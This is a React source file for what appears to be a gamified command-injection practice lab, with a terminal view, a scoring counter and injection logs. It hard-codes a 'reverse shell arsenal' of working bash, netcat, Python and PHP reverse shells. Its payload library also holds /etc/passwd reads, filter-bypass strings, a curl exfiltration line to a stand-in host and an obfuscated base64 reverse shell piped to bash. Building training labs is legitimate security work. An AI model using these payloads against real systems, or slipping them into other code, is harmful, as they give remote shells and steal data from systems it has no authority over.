import React, { useState } from "react";
import { 
  useGetHubStatus, 
  useGetEngines, 
  useExecPayload, 
  useGetLogs, 
  useClearLogs, 
  useGetSuggestions,
  getGetHubStatusQueryKey,
  getGetEnginesQueryKey,
  getGetLogsQueryKey,
  getGetSuggestionsQueryKey,
} from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";

const ENGINE_OPTIONS = [
  { value: "node/exec", label: "Node exec()" },
  { value: "node/spawn", label: "Node spawn()" },
  { value: "bash/bash", label: "Bash" },
  { value: "python/subprocess", label: "Python subprocess" },
  { value: "python/os_system", label: "Python os.system" },
  { value: "php/system", label: "PHP system()" },
  { value: "php/exec", label: "PHP exec()" },
  { value: "php/shell_exec", label: "PHP shell_exec()" },
  { value: "java/runtime", label: "Java Runtime.exec" },
  { value: "java/processbuilder", label: "Java ProcessBuilder" },
  { value: "cpp/system", label: "C++ system()" },
  { value: "cpp/popen", label: "C++ popen()" },
  { value: "powershell/powershell", label: "PowerShell" }
];

const REVERSE_SHELLS = [
  { name: "Bash TCP", payload: "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" },
  { name: "Netcat MK", payload: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f" },
  { name: "Python3", payload: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"YOUR_IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'" },
  { name: "PHP", payload: "php -r '$s=fsockopen(\"YOUR_IP\",4444);$p=proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);'" }
];

const PAYLOAD_LIBRARY = [
  { category: "Basic", payloads: ["id", "whoami", "uname -a", "cat /etc/passwd"] },
  { category: "Chained", payloads: ["8.8.8.8 && whoami", "8.8.8.8; cat /etc/passwd", "`id`", "$(id)"] },
  { category: "Bypass", payloads: ["${IFS}ls${IFS}-la", "l\\s", "cat${IFS}/etc/passwd", "w'h'o'a'm'i"] },
  { category: "Blind/OOB", payloads: ["8.8.8.8 && sleep 5", "ping -c 4 127.0.0.1", "8.8.8.8 && curl http://exfil.lab.local/$(id)", "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx' | base64 -d | bash"] }
];

export default function MainLab() {
  const queryClient = useQueryClient();
  const [cmd, setCmd] = useState("");
  const [engine, setEngine] = useState("bash/bash");
  const [mode, setMode] = useState("classic");
  const [output, setOutput] = useState("NEXUSFORGE OS v4.0.0\\nInitializing terminal...\\nReady.\\n");
  const [score, setScore] = useState(0);
  const [chain, setChain] = useState<string[]>([]);
  
  // Analytics counters
  const [analytics, setAnalytics] = useState({ total: 0, blind: 0, oob: 0, quantum: 0 });

  const { data: hubStatus } = useGetHubStatus({ query: { refetchInterval: 10000, queryKey: getGetHubStatusQueryKey() } });
  const { data: engines } = useGetEngines({ query: { refetchInterval: 10000, queryKey: getGetEnginesQueryKey() } });
  const { data: logs } = useGetLogs({ query: { refetchInterval: 3000, queryKey: getGetLogsQueryKey() } });
  
  const execPayload = useExecPayload();
  const clearLogs = useClearLogs();
  
  const suggestionsParams = { mode, cmd };
  const { data: suggestions, refetch: fetchSuggestions } = useGetSuggestions(suggestionsParams, { query: { enabled: false, queryKey: getGetSuggestionsQueryKey(suggestionsParams) } });

  const handleInject = () => {
    if (!cmd) return;
    
    execPayload.mutate({ data: { cmd, engine, mode, attacker: "exfil.lab.local" } }, {
      onSuccess: (res) => {
        setOutput(prev => `${prev}\\n$ ${cmd}\\n${res.output}`);
        setScore(prev => prev + 25 + (res.elapsed > 3000 ? 55 : 0));
        setChain(cmd.split(/[;&|]/).map(s => s.trim()).filter(Boolean));
        
        setAnalytics(prev => ({
          ...prev,
          total: prev.total + 1,
          blind: mode === 'blind' ? prev.blind + 1 : prev.blind,
          oob: mode === 'oob' ? prev.oob + 1 : prev.oob,
          quantum: mode === 'quantum' ? prev.quantum + 1 : prev.quantum,
        }));
        
        queryClient.invalidateQueries({ queryKey: ["/api/logs"] });
      },
      onError: (err: any) => {
        setOutput(prev => `${prev}\\n$ ${cmd}\\nERROR: ${err.message}`);
      }
    });
  };

  const getModeColor = (m: string) => {
    switch (m) {
      case 'classic': return 'text-lime-400';
      case 'blind': return 'text-yellow-400';
      case 'oob': return 'text-orange-400';
      case 'quantum': return 'text-purple-400';
      default: return 'text-zinc-400';
    }
  };

  return (
    <div className="min-h-screen bg-black text-zinc-300 font-mono flex flex-col">
      <header className="flex items-center justify-between px-6 py-4 border-b border-red-900/50 bg-zinc-950">
        <div className="flex items-center gap-4">
          <h1 className="text-xl font-bold text-red-600 tracking-widest">NEXUS FORGE v4.0</h1>
          <div className="flex items-center gap-2 text-xs">
            <span className={`w-2 h-2 rounded-full ${!hubStatus ? 'bg-yellow-500' : hubStatus.status === 'ok' ? 'bg-green-500' : 'bg-red-500'}`}></span>
            <span className="text-zinc-500 uppercase">{!hubStatus ? 'Connecting...' : hubStatus.status === 'ok' ? 'Hub Online' : 'Hub Offline'}</span>
          </div>
        </div>
        <div className="text-red-500 font-bold border border-red-900 px-4 py-1">
          SCORE: {score.toString().padStart(6, '0')}
        </div>
      </header>

      <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
        <aside className="w-full md:w-80 border-r border-red-900/50 bg-zinc-950 flex flex-col p-4 gap-6 overflow-y-auto">
          
          <div className="space-y-2">
            <label className="text-xs text-red-500 uppercase tracking-wider block">Target Engine</label>
            <select 
              value={engine} 
              onChange={e => setEngine(e.target.value)}
              className="w-full bg-black border border-red-900 p-2 text-zinc-300 focus:outline-none focus:border-red-500"
            >
              {ENGINE_OPTIONS.map(opt => {
                const engineKey = opt.value.split('/')[0] as keyof typeof engines;
                const available = engines ? engines[engineKey] : true;
                return (
                  <option key={opt.value} value={opt.value}>
                    {opt.label} {!available ? '[unavailable]' : ''}
                  </option>
                );
              })}
            </select>
          </div>

          <div className="space-y-2">
            <label className="text-xs text-red-500 uppercase tracking-wider block">Injection Mode</label>
            <div className="grid grid-cols-2 gap-2">
              {['classic', 'blind', 'oob', 'quantum'].map(m => (
                <button
                  key={m}
                  onClick={() => setMode(m)}
                  className={`p-2 border text-xs uppercase ${mode === m ? 'border-red-500 text-red-500 bg-red-950/30' : 'border-zinc-800 text-zinc-500 hover:border-zinc-600'}`}
                >
                  {m}
                </button>
              ))}
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-xs text-red-500 uppercase tracking-wider block">Payload</label>
            <textarea 
              value={cmd}
              onChange={e => setCmd(e.target.value)}
              className="w-full h-24 bg-black border border-red-900 p-2 text-lime-400 font-mono text-sm focus:outline-none focus:border-red-500 resize-none"
              placeholder="Enter command..."
            />
            <button
              onClick={handleInject}
              disabled={execPayload.isPending}
              className="w-full bg-red-900 text-white font-bold py-2 uppercase hover:bg-red-800 disabled:opacity-50 transition-colors"
            >
              {execPayload.isPending ? 'EXECUTING...' : 'INJECT'}
            </button>
            <button
              onClick={() => fetchSuggestions()}
              className="w-full bg-zinc-900 text-zinc-400 font-bold py-1 text-xs border border-zinc-800 uppercase hover:bg-zinc-800 transition-colors mt-2"
            >
              Get AI Suggestions
            </button>
            {suggestions && suggestions.length > 0 && (
              <div className="mt-2 space-y-1">
                {suggestions.map((s, i) => (
                  <div key={i} className="text-[10px] bg-zinc-900 text-lime-400 p-1 border border-zinc-800 cursor-pointer hover:bg-zinc-800" onClick={() => setCmd(s)}>
                    {s}
                  </div>
                ))}
              </div>
            )}
          </div>


          <div className="space-y-2">
            <label className="text-xs text-red-500 uppercase tracking-wider block">Reverse Shell Arsenal</label>
            <div className="space-y-2">
              {REVERSE_SHELLS.map((rs, i) => (
                <div key={i} className="border border-zinc-800 bg-black p-2 text-xs">
                  <div className="flex justify-between text-zinc-500 mb-1">
                    <span>{rs.name}</span>
                    <button onClick={() => navigator.clipboard.writeText(rs.payload)} className="hover:text-red-400">COPY</button>
                  </div>
                  <div className="truncate text-zinc-400">{rs.payload}</div>
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-xs text-red-500 uppercase tracking-wider block">Payload Library</label>
            {PAYLOAD_LIBRARY.map((lib, i) => (
              <div key={i} className="mb-2">
                <div className="text-xs text-zinc-500 mb-1">{lib.category}</div>
                <div className="flex flex-wrap gap-1">
                  {lib.payloads.map((p, j) => (
                    <button key={j} onClick={() => setCmd(p)} className="px-2 py-1 bg-zinc-900 hover:bg-zinc-800 text-[10px] border border-zinc-800">
                      {p}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>

        </aside>

        <main className="flex-1 flex flex-col min-w-0">
          <div className="flex-1 p-4 flex flex-col gap-4 overflow-hidden">
            
            <div className="flex-1 bg-black border border-red-900/50 flex flex-col overflow-hidden">
              <div className="bg-zinc-950 border-b border-red-900/50 px-4 py-2 flex items-center gap-2">
                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div className="w-3 h-3 rounded-full bg-green-500"></div>
                <div className="text-xs text-zinc-500 ml-4">root@nexus-target:~#</div>
              </div>
              <div className="flex-1 overflow-y-auto p-4 font-mono text-sm whitespace-pre-wrap text-lime-400">
                {output}
              </div>
            </div>

            {chain.length > 0 && (
              <div className="h-24 bg-black border border-red-900/50 p-4 overflow-x-auto flex items-center gap-2">
                <div className="text-xs text-red-500 mr-2 uppercase">Execution Chain:</div>
                {chain.map((c, i) => (
                  <React.Fragment key={i}>
                    <div className="px-3 py-1 bg-red-950 border border-red-900 text-red-400 text-sm whitespace-nowrap">
                      {c}
                    </div>
                    {i < chain.length - 1 && <div className="text-zinc-600">-&gt;</div>}
                  </React.Fragment>
                ))}
              </div>
            )}
            
          </div>

          <div className="h-64 border-t border-red-900/50 bg-zinc-950 p-4 flex gap-4">
            <div className="flex-1 flex flex-col overflow-hidden">
              <div className="flex justify-between items-center mb-2">
                <h3 className="text-xs text-red-500 uppercase">Live Injection Logs</h3>
                <button onClick={() => clearLogs.mutate()} className="text-xs text-zinc-500 hover:text-red-400">CLEAR LOGS</button>
              </div>
              <div className="flex-1 overflow-y-auto border border-zinc-900 bg-black">
                <table className="w-full text-xs text-left">
                  <thead className="bg-zinc-900 text-zinc-400 sticky top-0">
                    <tr>
                      <th className="p-2">TIME</th>
                      <th className="p-2">MODE</th>
                      <th className="p-2">ENGINE</th>
                      <th className="p-2">COMMAND</th>
                      <th className="p-2">MS</th>
                    </tr>
                  </thead>
                  <tbody>
                    {logs?.map(l => (
                      <tr key={l.id} className="border-t border-zinc-900">
                        <td className="p-2 text-zinc-500">{new Date(l.timestamp).toLocaleTimeString()}</td>
                        <td className="p-2"><span className={`${getModeColor(l.mode)} uppercase`}>{l.mode}</span></td>
                        <td className="p-2 text-zinc-400">{l.engine}</td>
                        <td className="p-2 font-mono truncate max-w-[200px]">{l.command}</td>
                        <td className="p-2 text-zinc-500">{l.responseTime}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
            
            <div className="w-48 flex flex-col border border-zinc-900 bg-black p-3">
              <h3 className="text-xs text-red-500 uppercase mb-3">Session Analytics</h3>
              <div className="space-y-2 text-sm flex-1">
                <div className="flex justify-between">
                  <span className="text-zinc-500">TOTAL:</span>
                  <span className="text-zinc-300">{analytics.total}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-zinc-500">BLIND:</span>
                  <span className="text-yellow-400">{analytics.blind}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-zinc-500">OOB:</span>
                  <span className="text-orange-400">{analytics.oob}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-zinc-500">QUANTUM:</span>
                  <span className="text-purple-400">{analytics.quantum}</span>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
